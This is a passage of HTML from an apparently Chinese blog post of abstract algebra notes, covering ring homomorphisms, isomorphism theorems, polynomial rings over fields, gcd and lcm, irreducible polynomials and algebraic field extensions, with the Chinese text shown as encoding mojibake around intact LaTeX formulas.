id="something-special"><a href="#something-special" class="headerlink" title="something special"></a>something special</h3><p>$R:$<strong>å«å¹ºäº¤æ¢ç¯</strong></p><ul><li>å®šç†1ï¼š$I$ æ˜¯<strong>ç´ ç†æƒ³</strong>$\Leftrightarrow R/I$ æ˜¯<strong>æ•´ç¯</strong></li><li>å®šç†2ï¼š$I$ æ˜¯<strong>æå¤§ç†æƒ³</strong>$\Leftrightarrow R/I$ æ˜¯<strong>åŸŸ</strong>(åŸŸæ˜¯æ•´ç¯)</li><li>å®šç†3ï¼š$M$æ˜¯æå¤§ç†æƒ³$\Longrightarrow M$æ˜¯ç´ ç†æƒ³</li><li>å•†ç¯$R/I:$é›¶å…ƒ$[\theta]_I=I$,å•ä½å…ƒ$[e]_I=e+I$$(R/I$æ˜¯éå¹³å‡¡çš„å«å¹ºäº¤æ¢ç¯)</li></ul><hr><h2 id="ç¯åŒæ€"><a href="#ç¯åŒæ€" class="headerlink" title="ç¯åŒæ€"></a>ç¯åŒæ€</h2><p><strong>å®šä¹‰</strong>ï¼š$(R,+,\cdot)å’Œ(R^{\prime},\oplus,\odot)æ˜¯ç¯ï¼Œ\forall a,b\in R,å‡½æ•°$</p><p>$f{:}R \to R^{\prime}$æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><script type="math/tex; mode=display">f(a+b)=f(a)\oplus f(b)$$    $((R,+)\text{åˆ°}(R^{\prime},\oplus)\text{çš„åŠ æ³•ç¾¤åŒæ€})$$$f(a\cdot b)=f(a)\odot f(b)</script><p>åˆ™ç§°$f$ä¸º$R$åˆ°$R^\prime$çš„ç¯åŒæ€</p><p>$åŒæ€æ ¸\operatorname{Ker}f:={a\in R|f(a)=\theta^{\prime}(Râ€™çš„é›¶å…ƒ)}$</p><p>$\text{æ‰©å±•:}S:=R\Longrightarrow f(R)=Imfï¼ŒIm f\text{æ˜¯}R^{\prime}\text{çš„å­ç¯}$</p><p>$æ‰©å±•ï¼šS^\prime:={\theta^{\prime}}\Rightarrow f^{-1}(S^{\prime})=f^{-1}({\theta^{\prime}})=Kerf,åŒæ€æ ¸Ker fæ˜¯Rçš„å­ç¯$</p><p>$æ‰©å±•ï¼šI^\prime:={\theta^{\prime}}\Longrightarrow f^{-1}(I^{\prime})=f^{-1}({\theta^{\prime}})=Kerf,åŒæ€æ ¸Kerfæ˜¯Rçš„ç†æƒ³$</p><p>åŒæ€æ ¸æ˜¯åŒè¾¹ç†æƒ³</p><hr><p>è®¾$f{:}R\to R^{\prime}$æ˜¯ç¯åŒæ€ï¼š</p><p><strong>å®šç†1</strong>ï¼šç¯åŒæ€æ˜¯å•å°„$\Leftrightarrow Kerf={\boldsymbol{\theta}}$<br><strong>å®šç†2</strong>ï¼šç¯åŒæ€æ˜¯æ»¡å°„$\Leftrightarrow I\boldsymbol{m}f=R^\prime$</p><hr><p>è®¾$f:R\to R^{\prime}$æ˜¯ç¯åŒæ€ï¼Œ$\forall a\in R:$<br><strong>æ€§è´¨1</strong>ï¼š$f(ka)=k f(a),k\in \mathbb{Z}$<br><strong>æ€§è´¨2</strong>ï¼š$f(a^k)=f(a)^k,k\in\mathbb{N}$</p><hr><p>$fæ˜¯æ»¡åŒæ€,Ræ˜¯å«å¹ºç¯:$</p><p>æ€§è´¨3$:f(a^k)=f(a)^k,\quad k\in Z,\quad a\text{æœ‰ä¹˜æ³•é€†å…ƒ}$<br>æ€§è´¨4$:f(e)=e^{\prime},\quad e^{\prime}\text{æ˜¯}R^{\prime}çš„å•ä½å…ƒ$</p><hr><p>ç¯çš„ç†æƒ³å¯¹åº”åŒæ€åƒçš„ç†æƒ³ï¼ŒåŒæ€åƒçš„ç†æƒ³åç©¿è¶Šåä¸€å®šæ˜¯å®šä¹‰åŸŸçš„ç†æƒ³ã€‚</p><h3 id="ç¯åŒæ€çš„å¤åˆ"><a href="#ç¯åŒæ€çš„å¤åˆ" class="headerlink" title="ç¯åŒæ€çš„å¤åˆ"></a>ç¯åŒæ€çš„å¤åˆ</h3><p><strong>å®šç†</strong>ï¼š$f$æ˜¯$R$åˆ°$R^\prime$çš„ç¯åŒæ€ï¼Œ$f^\prime$æ˜¯$R^{\prime}$åˆ°$Râ€™â€™$çš„ç¯åŒæ€ï¼Œåˆ™$f$å’Œ$f^\prime$çš„å¤åˆ<script type="math/tex">f^{\prime}\circ f{:}R\to R^{\prime\prime}</script>ä¹Ÿæ˜¯ç¯åŒæ€</p><h3 id="åµŒå…¥æ˜ å°„"><a href="#åµŒå…¥æ˜ å°„" class="headerlink" title="åµŒå…¥æ˜ å°„"></a>åµŒå…¥æ˜ å°„</h3><p><img src="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/image-20240814163834046.png" alt="image-20240814163834046"></p><h3 id="è‡ªç„¶æ˜ å°„"><a href="#è‡ªç„¶æ˜ å°„" class="headerlink" title="è‡ªç„¶æ˜ å°„"></a>è‡ªç„¶æ˜ å°„</h3><p><img src="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/image-20240814163850181.png" alt="image-20240814163850181"></p><h3 id="ä¾‹"><a href="#ä¾‹" class="headerlink" title="ä¾‹"></a>ä¾‹</h3><p><img src="/2024/08/09/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E7%8E%AF%E8%AE%BA/image-20240814163906444.png" alt="image-20240814163906444"></p><hr><h2 id="å•ä½-unit"><a href="#å•ä½-unit" class="headerlink" title="å•ä½(unit)"></a>å•ä½(unit)</h2><p>æœ‰<strong>ä¹˜æ³•é€†å…ƒ</strong>çš„å…ƒç´ ç§°ä¸º<strong>å•ä½</strong></p><p>å®šä¹‰ï¼šè®¾ç¯$R,a\in R$æ˜¯ï¼Œå¦‚æœ$\exists b\in R$,ä½¿å¾—<script type="math/tex">ab=ba=e,</script>åˆ™ç§°$a$ä¸º<strong>å•ä½</strong></p><h3 id="å•ä½ç¾¤-group-of-units"><a href="#å•ä½ç¾¤-group-of-units" class="headerlink" title="å•ä½ç¾¤(group of units)"></a>å•ä½ç¾¤(group of units)</h3><p>å®šä¹‰ï¼šè®¾ç¯$R$,ç§°<br>$R^<em>:={a|a\in R,a$ æ˜¯å•ä½$}$ä¸º<strong>Rçš„å•ä½ç¾¤</strong>ã€‚<br>$R^</em>$æ˜¯ä¹˜æ³•ç¾¤ï¼Œå•ä½å…ƒæ˜¯$e$ $(e\in R)$</p><p>$Z_n^*{:}Z_n\text{çš„å•ä½ç¾¤}$</p><h2 id="ç¯åŒæ„-ring-isomorphism"><a href="#ç¯åŒæ„-ring-isomorphism" class="headerlink" title="ç¯åŒæ„(ring isomorphism)"></a><strong>ç¯åŒæ„</strong>(ring isomorphism)</h2><ul><li>åŒå°„(å•å°„&amp;æ»¡å°„)</li><li>ç¯åŒæ€</li></ul><p>$R$ä¸ $R^{\prime }$åŒæ„ï¼Œè®°ä¸º$R\cong R^\prime$<br>$R$ä¸$R$ä¹‹é—´çš„åŒæ„ï¼šç¯è‡ªåŒæ„(ring automorphism)</p><h3 id="ç¯-ç¬¬ä¸€åŒæ„å®šç†-first-isomorphism-theorem"><a href="#ç¯-ç¬¬ä¸€åŒæ„å®šç†-first-isomorphism-theorem" class="headerlink" title="(ç¯)ç¬¬ä¸€åŒæ„å®šç†(first isomorphism theorem)"></a>(ç¯)ç¬¬ä¸€åŒæ„å®šç†(first isomorphism theorem)</h3><p>å®šç†ï¼šè®¾ç¯$R$å’Œ$R^\prime,f{:}R\to R^\prime$æ˜¯ç¯åŒæ€(åŒæ€æ ¸æ˜¯$Kerf$,åŒæ€åƒæ˜¯$Imf$),åˆ™</p><script type="math/tex; mode=display">R/Kerf\cong Imf</script><script type="math/tex; mode=display">\rho:\quad[a]_{Kerf}\quad f(a)</script><p>$\rho^{\prime}:R/Kerf\to R^{\prime}\text{ å•ä¸€åŒæ€}$</p><h3 id="ä¸­å›½å‰©ä½™æ˜ å°„"><a href="#ä¸­å›½å‰©ä½™æ˜ å°„" class="headerlink" title="ä¸­å›½å‰©ä½™æ˜ å°„"></a>ä¸­å›½å‰©ä½™æ˜ å°„</h3><p>ç¯åŒæ€   $f{:}Z\to Z_{n_1}\times\cdotp\cdotp\cdotp\times Z_{n_m}$</p><script type="math/tex; mode=display">a\quad f(a)=([a]_{n_1},...,[a]_{n_m})</script><script type="math/tex; mode=display">n_i|a\Leftrightarrow[a]_{n_i}=[0]_{n_i}</script><script type="math/tex; mode=display">n_1|a,...,n_m|a\Leftrightarrow([a]_{n_1},...,[a]_{n_m})=([0]_{n_1},...,[0]_{n_m})</script><p>$\Leftrightarrow a\in Kerf$<br>$\Leftrightarrow a\in nZ\Leftrightarrow nZ=Kerf$</p><p>ç¯åŒæ„(ä¸­å›½å‰©ä½™æ˜ å°„)<script type="math/tex">\rho{:}Z_n\to Z_{n_1}\times\cdotp\cdotp\cdotp\times Z_{n_m}</script><br>$[ a]$ $\rho ( a) = \left ( [ a] _{n_1}, . . . , [ a] _{n_m}\right ) ( = f( a) )$</p><hr><p>ç¯åŒæ„$\rho{:}R\to R^{\prime}$<br>(ä¹˜æ³•)ç¾¤åŒæ„$\overline {\boldsymbol{\rho }}{: }R^<em> \to R^{\prime </em> }$ $(R ^<em> \cong R ^{\prime </em> })$</p><hr><p>(ä¸­å›½å‰©ä½™æ˜ å°„)<script type="math/tex">\rho{:}Z_n\to Z_{n_1}\times\cdotp\cdotp\cdotp\times Z_{n_m}</script><br>(ä¹˜æ³•)ç¾¤åŒæ„<script type="math/tex">Z_n^*\cong Z_{n_1}^*\times\cdots\times Z_{n_m}^*</script><br>$[a]\quad([a]_{n_1},â€¦,[a]_{n_m})$</p><hr><h2 id="å¤šé¡¹å¼ç¯-polynomial-ring"><a href="#å¤šé¡¹å¼ç¯-polynomial-ring" class="headerlink" title="å¤šé¡¹å¼ç¯(polynomial ring)"></a>å¤šé¡¹å¼ç¯(polynomial ring)</h2><h3 id="å¤šé¡¹å¼-polynomial"><a href="#å¤šé¡¹å¼-polynomial" class="headerlink" title="å¤šé¡¹å¼(polynomial)"></a>å¤šé¡¹å¼(polynomial)</h3><p>$f(x)=\sum_{i=0}^ka_ix^i=a_0+a_1x+\cdots+a_kx^k$</p><p>$a_0,a_1,â€¦,a_k\in R$</p><p>$xä¸ºä¸å®šå…ƒï¼Œa_iä¸ºç³»æ•°ï¼Œa_0å¸¸æ•°é¡¹ï¼Œa_ké¦–é¡¹ç³»æ•°ï¼Œkä¸ºéè´Ÿæ•´æ•°å«å¤šé¡¹å¼çš„åº¦(deg(f(x)))$</p><h3 id="å¤šå½¢å¼ç¯-polynomial-ring"><a href="#å¤šå½¢å¼ç¯-polynomial-ring" class="headerlink" title="å¤šå½¢å¼ç¯(polynomial ring)"></a>å¤šå½¢å¼ç¯(polynomial ring)</h3><p><strong>å®šä¹‰</strong>ï¼šæ‰€æœ‰å…³äºä¸å®šå…ƒ$x$ã€ç³»æ•°å±äºç¯$R$çš„å¤šé¡¹å¼<br>$f(x)=a_0+a_1x+\cdots+a_kx^k$</p><script type="math/tex; mode=display">a_0,a_1,...a_k\in R</script><p>å½¢æˆçš„ç¯ï¼Œç§°ä¸º$R$ä¸Šçš„<strong>å¤šé¡¹å¼ç¯</strong>ï¼Œè®°ä¸º$R[X]$ã€‚</p><p>$R$å«$R[X]$çš„<strong>åŸºç¯(base ring)</strong>ã€‚</p><script type="math/tex; mode=display">\begin{aligned}&f(x)=a_0+a_1x+\cdots+a_kx^k\\&g(x)=b_0+b_1x+\cdots+b_mx^m\\&\text{åŠ æ³•:}f(x)+g(x)=c_0+\cdots+c_t\cdot x^t\\&t=max(k,m)\\&c_{i}=a_{i}+b_{i}, i=0,1,...,t\\&\text{ä¹˜æ³•:}f(x)g(x)=c_0+\cdots+c_t\cdot x^t\\&t=k+m\\&c_{s}=\sum_{i=0}^{s}a_{i}b_{s-i}, s=0,1,...,t\end{aligned}</script><p><strong>æ³¨æ„</strong>ï¼š<script type="math/tex">f(x)g(x)\text{åœ¨}b\text{çš„å–å€¼æœªå¿…ç­‰äº}f(b)g(b)(ä¹˜æ³•äº¤æ¢å¾‹)</script></p><h3 id="å¤šé¡¹å¼é™¤æ³•-polynomial-division"><a href="#å¤šé¡¹å¼é™¤æ³•-polynomial-division" class="headerlink" title="å¤šé¡¹å¼é™¤æ³•(polynomial division)"></a>å¤šé¡¹å¼é™¤æ³•(polynomial division)</h3><p>è®¾åŸŸ$F,f(x),g(x)\in F[X],g(x)\neq\theta$ã€‚å­˜åœ¨å”¯ä¸€çš„$q(x),r(x)\in F[X]$,ä½¿å¾—<br><script type="math/tex">f(x)=q(x)g(x)+r(x),\quad deg(r(x))<deg(g(x))</script></p><h3 id="ä¸€äº›æ€§è´¨"><a href="#ä¸€äº›æ€§è´¨" class="headerlink" title="ä¸€äº›æ€§è´¨"></a>ä¸€äº›æ€§è´¨</h3><script type="math/tex; mode=display">f(x)=a_0+a_1x+\cdots+a_kx^kï¼›\quad g(x)=b_0+b_1x+\cdots+b_mx^m</script><script type="math/tex; mode=display">deg(f(x)+g(x))\leq max(deg(f(x)),deg(g(x)))\\deg(f(x)g(x))\leq deg(f(x))+deg(g(x))</script><script type="math/tex; mode=display">f(x)g(x)=a_0b_0+\cdots+a_kb_mx^{k+m}</script><p>$R$æ˜¯æ•´ç¯ï¼Œåˆ™<script type="math/tex">deg(f(x)g(x))=deg(f(x))+deg(g(x))</script></p><hr><p>$R={\theta}\Leftrightarrow R[X]={\theta}$<br>$S$æ˜¯$R$çš„å­ç¯$\Leftrightarrow S[X]$æ˜¯$R[X]$çš„å­ç¯<br>$R$ æ˜¯å«å¹ºç¯$\Leftrightarrow R[X]$æ˜¯å«å¹ºç¯ (å•ä½å…ƒéƒ½æ˜¯$e)$<br>$R$ æ˜¯äº¤æ¢ç¯$\Leftrightarrow R[X]$ æ˜¯äº¤æ¢ç¯<br>$R$ æ˜¯æ•´ç¯$\Longrightarrow R[X]$ æ˜¯æ•´ç¯<br>$F$ æ˜¯åŸŸ$\Longrightarrow F[X]$ æ˜¯æ•´ç¯$(F[X]$ä¸æ˜¯åŸŸ)</p><h3 id="å¸¸æ•°å¤šé¡¹å¼-constant-polynomial"><a href="#å¸¸æ•°å¤šé¡¹å¼-constant-polynomial" class="headerlink" title="å¸¸æ•°å¤šé¡¹å¼ (constant polynomial)"></a>å¸¸æ•°å¤šé¡¹å¼ (constant polynomial)</h3><p>$a\in R$å¯ä»¥çœ‹æˆåªæœ‰å¸¸æ•°é¡¹çš„å¤šé¡¹å¼</p><script type="math/tex; mode=display">a=a+\theta x+\cdots+\theta x^k,</script><p>ç§°ä¸ºå¸¸æ•°å¤šé¡¹å¼ã€‚<br>$R$æ˜¯$R[X]$çš„å­ç¯    $R[X]$ çš„é›¶å…ƒï¼šé›¶å¤šé¡¹å¼$\theta$</p><h3 id="é¦–ä¸€å¤šé¡¹å¼"><a href="#é¦–ä¸€å¤šé¡¹å¼" class="headerlink" title="é¦–ä¸€å¤šé¡¹å¼"></a>é¦–ä¸€å¤šé¡¹å¼</h3><p><strong>å®šä¹‰</strong>ï¼šè®¾ $R$æ˜¯å«ä¹ˆç¯ï¼Œ$f(x)\in R[X],f(x)$çš„é¦–é¡¹ç³»æ•°æ˜¯å•ä½å…ƒ$e$,$f(x)$å«é¦–ä¸€å¤šé¡¹å¼ã€‚<br>ä¾‹ï¼šè®¾$a,b\in F$,åˆ™$a+bx+x^2$ æ˜¯é¦–ä¸€å¤šé¡¹å¼ï¼Œå› ä¸ºé¦–é¡¹ç³»æ•°(æœ€é«˜é¡¹$x^2$çš„ç³»æ•°)ä¸º$e$</p><p>$f(x)\in F[X],f(x)$çš„é¦–é¡¹ç³»æ•°æ˜¯$a_k,g(x)=a_k^{-1}\cdot f(x)$,åˆ™$g(x)$æ˜¯é¦–ä¸€å¤šé¡¹å¼<br>æ˜“çŸ¥ï¼Œ$deg(f(x))=deg(g(x))$</p><h3 id="åŸŸä¸Šå¤šé¡¹å¼"><a href="#åŸŸä¸Šå¤šé¡¹å¼" class="headerlink" title="åŸŸä¸Šå¤šé¡¹å¼"></a>åŸŸä¸Šå¤šé¡¹å¼</h3><ul><li>åŸŸ$F$</li><li>å¤šé¡¹å¼ç¯$F[X]$</li></ul><h3 id="æœ€å¤§å…¬å› å¼"><a href="#æœ€å¤§å…¬å› å¼" class="headerlink" title="æœ€å¤§å…¬å› å¼"></a>æœ€å¤§å…¬å› å¼</h3><p><strong>å®šç†</strong>ï¼šè®¾åŸŸ$F,f_1(x),â€¦,f_n(x)\in F[X]$,$\exists f_i(x)\neq\theta(1\leq i\leq n)$ã€‚<br>$å­˜åœ¨å”¯ä¸€çš„é¦–ä¸€å¤šé¡¹å¼d(x)\in F[X]$,ä½¿å¾—<br>$d(x)|f_1(x),â€¦,d(x)|f_n(x)$<br>$\forall c(x)\in F[X],c(x)|f_1(x),â€¦,c(x)|f_n(x)$,åˆ™$c(x)|d(x)$<br>$d(x)$ç§°ä¸º $f_1(x),â€¦,f_n(x)$ çš„<strong>æœ€å¤§å…¬å› å¼</strong></p><p>å¿…ç„¶å­˜åœ¨$b_1(x),â€¦,b_n(x)\in F[X]$,æœ‰</p><script type="math/tex; mode=display">d(x)=b_1(x)f_1(x)+\cdots+b_n(x)f_n(x)</script><p>å¦‚æœ $gcd(f_1(x),â€¦,f_n(x))=e$,ç§°$f_1(x),â€¦,f_n(x)$<strong>äº’ç´ </strong></p><script type="math/tex; mode=display">gcd(f_1(x),...,f_n(x))=gcd(gcd(f_1(x),f_2(x)),...,f_n(x))</script><h4 id="å¤šé¡¹å¼ä¸Šçš„æ¬§å‡ é‡Œå¾—ç®—æ³•"><a href="#å¤šé¡¹å¼ä¸Šçš„æ¬§å‡ é‡Œå¾—ç®—æ³•" class="headerlink" title="å¤šé¡¹å¼ä¸Šçš„æ¬§å‡ é‡Œå¾—ç®—æ³•"></a>å¤šé¡¹å¼ä¸Šçš„æ¬§å‡ é‡Œå¾—ç®—æ³•</h4><p>æ±‚$f(x),g(x)\in F[X]$çš„æœ€å¤§å…¬å› å¼<br>$f\left(x\right)=q_{1}\left(x\right)g\left(x\right)+r_{1}\left(x\right)$<br>$g(x)=q_{2}(x)r_{1}(x)+r_{2}(x)$<br>$r_{1}(x)=q_{3}(x)r_{2}(x)+r_{3}(x)$<br>â€¦â€¦<br>$r_{n-2}(x)=q_n(x)r_{n-1}(x)+r_n(x)$<br>$r_{n-1}(x)=q_{n+1}(x)r_n(x)$</p><script type="math/tex; mode=display">\text{è®¾ }r_n(x)\text{é¦–é¡¹ç³»æ•°ä¸º }a_k(\neq e)\\gcd(f(x),g(x))=a_k^{-1}\cdot r_n(x)</script><h3 id="æœ€å°å…¬å€å¼"><a href="#æœ€å°å…¬å€å¼" class="headerlink" title="æœ€å°å…¬å€å¼"></a>æœ€å°å…¬å€å¼</h3><p><strong>å®šç†</strong>ï¼šè®¾åŸŸ$F,f_1(x),â€¦,f_n(x)\in F[X],\forall f_i(x)\neq\theta (1\leq i\leq n$)ã€‚å­˜åœ¨<strong>å”¯ä¸€</strong>çš„<strong>é¦–ä¸€å¤šé¡¹å¼</strong>$m(x)\in F[X]$,ä½¿å¾—<br>$f_1(x)|\boldsymbol{m}(x),â€¦,f_n(x)|\boldsymbol{m}(x)$<br>$\forall c(x)\in F[X],f_1(x)|c(x),â€¦,f_n(x)|c(x)$,åˆ™$m(x)|c(x)$<br>$m(x)$ç§°ä¸º$f_1(x),â€¦,f_n(x)$çš„<strong>æœ€å°å…¬å€å¼</strong></p><script type="math/tex; mode=display">\begin{aligned}&\text{éé›¶å¤šé¡¹å¼}f(x),g(x)\in F[X]\text{,åˆ™}\\&a_k^{-1}\cdot f(x)g(x)=lcm(f(x),g(x))\cdot gcd(f(x),g(x)),\\&\text{å…¶ä¸­,}a_k\text{ æ˜¯}f(x)g(x)\text{çš„é¦–é¡¹ç³»æ•°}\end{aligned}</script><script type="math/tex; mode=display">lcm(f_1(x),...,f_n(x))=lcm(lcm(f_1(x),f_2(x)),...,f_n(x))$$</script><h3 id="å¤šé¡¹å¼ç¯çš„ç†æƒ³"><a href="#å¤šé¡¹å¼ç¯çš„ç†æƒ³" class="headerlink" title="å¤šé¡¹å¼ç¯çš„ç†æƒ³"></a>å¤šé¡¹å¼ç¯çš„ç†æƒ³</h3><p>åŠ æ³•å­ç¾¤â†’ç†æƒ³</p><ul><li>ç¯$Z$:åŠ æ³•å­ç¾¤$(mZ,+)\to$ç†æƒ³$(Z,+,\times)$</li><li>ç¯$Z_n$:åŠ æ³•å­ç¾¤ ($mZ_n,+)\to$ç†æƒ³ ($mZ_n,+,\times)$</li></ul><p><strong>å®šç†</strong>:$è®¾a\in R\text{,åˆ™ }J={g(x)\in R[X]|g(\alpha)=\theta}\text{æ˜¯}R[X]çš„ç†æƒ³ã€‚$</p><p><strong>å®šç†</strong>ï¼š$F[X]$ æ˜¯ä¸»ç†æƒ³æ•´ç¯ã€‚$F[X]$çš„æ¯ä¸ªéé›¶ç†æƒ³$J$,éƒ½å­˜åœ¨å”¯ä¸€çš„é¦–ä¸€å¤šé¡¹å¼$g(x)\in F[X]$,æœ‰$J=(g(x))$ã€‚(ç†æƒ³éƒ½æ˜¯ä¸»ç†æƒ³çš„æ•´ç¯ï¼Œç§°ä¸»ç†æƒ³æ•´ç¯)</p><p>$F[X]$ æ˜¯ä¸»ç†æƒ³æ•´ç¯$\Longrightarrow F[X]$ çš„ç†æƒ³éƒ½æ˜¯ä¸»ç†æƒ³<br>$F[X]$çš„ç†æƒ³éƒ½å¯ä»¥å†™æˆ $(f(x))$ çš„å½¢å¼ï¼Œ$f(x)\in F[X]$</p><script type="math/tex; mode=display">\begin{aligned}\left(f(x)\right)&=\{f(x)c(x)\mid c(x)\in F[X]\}\\&=\{c(x)f(x)\mid c(x)\in F[X]\}\end{aligned}</script><p>$\exists g( x) \in F[ X]$, $g( x)$æ˜¯å”¯ä¸€çš„é¦–ä¸€å¤šé¡¹å¼ï¼Œä½¿$\left(f(x)\right)=\left(g(x)\right)$</p><h3 id="ä¸å¯çº¦å¤šé¡¹å¼-irreducible-polynomial"><a href="#ä¸å¯çº¦å¤šé¡¹å¼-irreducible-polynomial" class="headerlink" title="ä¸å¯çº¦å¤šé¡¹å¼ (irreducible polynomial)"></a>ä¸å¯çº¦å¤šé¡¹å¼ (irreducible polynomial)</h3><p><strong>å®šä¹‰</strong>ï¼šè®¾åŸŸ$F$,$p(x)\in F[X]$ã€‚å¦‚æœ$deg(p(x))&gt;0$,$p(x)=$ $b(x)c(x)$,åˆ™$deg(b(x))=0$æˆ–$deg(c(x))=0$(å…¶ä¸­ä¸€ä¸ªæ˜¯å¸¸æ•°å¤šé¡¹å¼),ç§°$p(x)$åœ¨$F$ä¸Šä¸å¯çº¦çš„(åˆç§°åœ¨ $F[X]$é‡Œä¸å¯çº¦çš„æˆ–ç´ çš„)</p><h4 id="F-X-ä¸­çš„å”¯ä¸€åˆ†è§£"><a href="#F-X-ä¸­çš„å”¯ä¸€åˆ†è§£" class="headerlink" title="$F[X]$ä¸­çš„å”¯ä¸€åˆ†è§£"></a>$F[X]$ä¸­çš„å”¯ä¸€åˆ†è§£</h4><p><strong>å®šç†</strong>ï¼š$\forall g(x)\in F[X]$, $deg(g(x))&gt;0$,åˆ™$g(x)$å¯å”¯ä¸€åœ°å†™æˆå¦‚ä¸‹<strong>å½¢å¼</strong>ï¼š</p><script type="math/tex; mode=display">g(x)=ap_1^{e_1}(x)p_2^{e_2}(x)...p_k^{e_k}(x),</script><p>å…¶ä¸­ï¼Œ$a\in F,p_1(x),p_2(x),â€¦,p_k(x)\in F[X]$æ˜¯å½¼æ­¤ä¸åŒçš„<strong>é¦–ä¸€ä¸å¯çº¦å¤šé¡¹å¼</strong>ï¼Œ$e_1,e_2,â€¦,e_k\in\mathbb{N}$ã€‚</p><h2 id="ä»£æ•°æ‰©åŸŸ"><a href="#ä»£æ•°æ‰©åŸŸ" class="headerlink" title="ä»£æ•°æ‰©åŸŸ"></a>ä»£æ•°æ‰©åŸŸ</h2><ul><li><p><strong>æ‰©åŸŸ</strong>:$K$æ˜¯$F$çš„å­åŸŸï¼Œ$F$å°±æ˜¯$K$çš„æ‰©åŸŸæˆ–æ‰©å¼ (extension)</p></li><li><p><strong>çœŸå­åŸŸ</strong>:$K$è¿˜æ˜¯$F$çš„çœŸå­é›†ï¼Œåˆ™$K$æ˜¯$F$çš„çœŸå­åŸŸ</p></li><li><p><strong>ç´ åŸŸ</strong>(prime field):æ²¡æœ‰çœŸå­åŸŸçš„åŸŸ</p><p><strong>å®šç†1</strong>ï¼šåŸŸ$F$æ‰€æœ‰å­åŸŸçš„äº¤é›†$K$æ„æˆå®ƒçš„ç´ å­åŸŸã€‚</p><p><strong>å®šç†2</strong>ï¼šè®¾$K$æ˜¯$F$çš„å­åŸŸï¼Œé›†åˆ$M\subseteq F$,è®° $K(M)$ æ˜¯$F$æ‰€æœ‰åŒ…å«$K$å’Œ$M$çš„å­åŸŸçš„äº¤é›†ã€‚<br>$(1)K(M)$æ˜¯$K$çš„æ‰©åŸŸã€‚<br>$(2)K(M)$æ˜¯åŒ…å«$K$å’Œ$M$çš„æœ€å°å­åŸŸã€‚</p><blockquote><p>ç´ åŸŸçš„ä»»ä½•çœŸå­é›†éƒ½ä¸å¯èƒ½æ„æˆå®ƒçš„å­åŸŸ<br>ç´ åŸŸçš„ä»»ä½•å­åŸŸéƒ½æ˜¯å®ƒæœ¬èº«</p><p><strong>ä¾‹</strong>ï¼šæœ‰ç†æ•°åŸŸæ˜¯ç´ åŸŸ</p></blockquote></li></ul><h3 id="ä»£æ•°æ‰©åŸŸ-algebraic-extension-field"><a href="#ä»£æ•°æ‰©åŸŸ-algebraic-extension-field" class="headerlink" title="ä»£æ•°æ‰©åŸŸ(algebraic extension field)"></a>ä»£æ•°æ‰©åŸŸ(algebraic extension field)</h3><p><strong>å®šä¹‰</strong>ï¼š$K$æ˜¯$F$çš„å­åŸŸï¼Œåˆ™</p><p>(1) å¯¹äº$a\in F$,å­˜åœ¨éå¸¸æ•°å¤šé¡¹å¼$f(\boldsymbol{x})$,å…¶ç³»æ•°æ¥è‡ª$K$,æœ‰<br>$f(a)=\theta$,ç§°$a$ æ˜¯$K$ä¸Š<strong>ä»£æ•°çš„</strong>ã€‚(å¦‚æœ<strong>ä¸å­˜åœ¨</strong>è¿™æ ·çš„å¤šé¡¹å¼ï¼Œ$a$å«$K$ä¸Š<strong>è¶…è¶Šçš„</strong>)</p><p>(2)$L$æ˜¯$K$çš„æ‰©åŸŸã€‚$\forall b\in L$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œç§°$L$æ˜¯$K$çš„ä»£æ•°æ‰©åŸŸæˆ–<strong>ä»£æ•°æ‰©å¼ </strong> (algebraic extension)ã€‚</p><p><strong>å®šç†</strong>ï¼š$J={f(x)\in K[X]|f(a)=\theta}$,å­˜åœ¨å”¯ä¸€çš„é¦–ä¸€å¤šé¡¹å¼$g(x)\in K[X]$,æœ‰$J=(g(x))$ã€‚<br><strong>å®šç†</strong>ï¼šä»¥ä¸Š$g(x)$æ˜¯$K[X]$ä¸­ä¸å¯çº¦å¤šé¡¹å¼ã€‚</p><h3 id="æå°å¤šé¡¹å¼-minimal-polynomial"><a href="#æå°å¤šé¡¹å¼-minimal-polynomial" class="headerlink" title="æå°å¤šé¡¹å¼ (minimal polynomial)"></a>æå°å¤šé¡¹å¼ (minimal polynomial)</h3><p>æ€§è´¨ï¼š$K$æ˜¯$F$çš„å­åŸŸï¼Œ$a$æ˜¯$K$ä¸Šä»£æ•°çš„ï¼Œç›¸åº”çš„æå°å¤šé¡¹å¼ä¸º</p><p>$g(x)\in K[X]$,åˆ™ï¼š</p><ol><li><p>$g(x)$ æ˜¯$K[X]$é‡Œçš„ä¸å¯çº¦å¤šé¡¹å¼ (è¯æ˜è§ä¸ŠæœŸ)</p></li><li><script type="math/tex; mode=display">g(x)\mid f(x)\Leftrightarrow f(x)\in K[X],\:f(a)=\theta</script></li><li><p>$g(x)$æ˜¯$K[X]$é‡Œä»¥$a$ä¸ºæ ¹çš„é¦–ä¸€å¤šé¡¹å¼ä¸­åº¦æœ€å°çš„</p><script type="math/tex; mode=display">J=(g(x))=\{f(x)\in K[X]|f(a)=\theta\}</script></li></ol><h2 id="åŸŸçš„æ‰©å¼ "><a href="#åŸŸçš„æ‰©å¼ " class="headerlink" title="åŸŸçš„æ‰©å¼ "></a>åŸŸçš„æ‰©å¼ </h2><p>æ‰©åŸŸæ˜¯å‘é‡ç©ºé—´</p><p><strong>å®šç†ï¼šåŸŸæ˜¯å…¶ä»»æ„å­åŸŸä¸Šçš„å‘é‡ç©ºé—´</strong></p><h3 id="å‘é‡ç©ºé—´-vector-space"><a href="#å‘é‡ç©ºé—´-vector-space" class="headerlink" title="å‘é‡ç©ºé—´(vector space)"></a>å‘é‡ç©ºé—´(vector space)</h3><p>å®šä¹‰ï¼šè®¾$v$æ˜¯éç©ºé›†åˆï¼Œ$K$çš„åŸŸï¼Œ$V$ä¸­å…ƒç´ ç§°ä¸º<strong>å‘é‡(vector)</strong>,$K$ç§°ä¸ºå…¶<strong>åŸºåŸŸ(base field)</strong>, $K$ä¸­å…ƒç´ ç§°ä¸º<strong>æ 